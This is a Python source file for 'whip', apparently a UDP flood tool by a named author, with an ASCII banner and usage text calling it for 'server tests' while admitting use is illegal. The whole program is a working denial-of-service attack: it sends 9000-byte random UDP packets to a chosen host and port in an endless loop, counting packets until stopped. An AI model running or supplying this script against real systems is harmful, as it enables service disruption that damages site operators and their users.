import socket
import subprocess
import time
import random
import optparse
from termcolor import colored


subprocess.call(["clear"])

def banner():
    print(colored("""
	 ▄█     █▄     ▄█    █▄     ▄█     ▄███████▄ 
	███     ███   ███    ███   ███    ███    ███ 
	███     ███   ███    ███   ███▌   ███    ███ 
	███     ███  ▄███▄▄▄▄███▄▄ ███▌   ███    ███ 
	███     ███ ▀▀███▀▀▀▀███▀  ███▌ ▀█████████▀  
	███     ███   ███    ███   ███    ███        
	███ ▄█▄ ███   ███    ███   ███    ███        
	 ▀███▀███▀    ███    █▀    █▀    ▄████▀             
    ""","green"))
    print(colored("	Version : 1.1","red"))
banner()


def usage():
	print(colored("""
	*********************************************************************
	Creator : @fatihkeeles
	https://www.webfatihkeles.com
	Can only be used for server tests ! Your ip is visible.
	It is illegal to use, the user is responsible for the provisions !
	---------------------------------------------------------------------
	Usage:
	python3 whip.py -H <target host> -p <port number>
	-h, --help : help message
	-H, --host : Server IP address
	-p, --port : port (default : 80)
	 --------------------------------------------------------------------"""
	,"yellow"))
	print(colored
	("	Bug Reporties link :","blue"))
	print(colored
	("	www.instagram.com/fatihkeeles","red"))
	print(colored("	**********************************************************************","yellow"))
usage()

def program():

    con = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(9000)

    parser = optparse.OptionParser(add_help_option=False)
    parser.add_option("-H","--host", dest="tgtHost", type="string", help="Specify target ıp address.")
    parser.add_option("-p","--port", dest="tgtPort", type="int", help="Specify target port number.")
    parser.add_option("-h","--help", dest="help", type="string", help="help message.")
    (options, args) = parser.parse_args()
    tgtHost = options.tgtHost
    tgtPort = options.tgtPort

    if (options.tgtPort == None):
    	tgtPort = 80
         

    counter = 0

    try:
        while True:
            con.sendto(data, (tgtHost,tgtPort))
            counter += 1
            print(colored("Packet send %d " % (counter),"red"),tgtHost)
            
    
    except KeyboardInterrupt:
        print(colored("""
[!] Attack stopped
        ""","yellow"))
        opinion = input(colored("Would you like to let us know your opinion about the script? (Y / N) : ","blue"))
        if (opinion == "Y") or (opinion == "y"):
        	subprocess.call(["firefox", "https://www.instagram.com/fatihkeeles"])
        else:
        	exit()
    
    
    except socket.error as e:
    	print(colored("""
[!] check server ip and port
    	""","yellow"))
    
    
    except:
    	print("")
program()
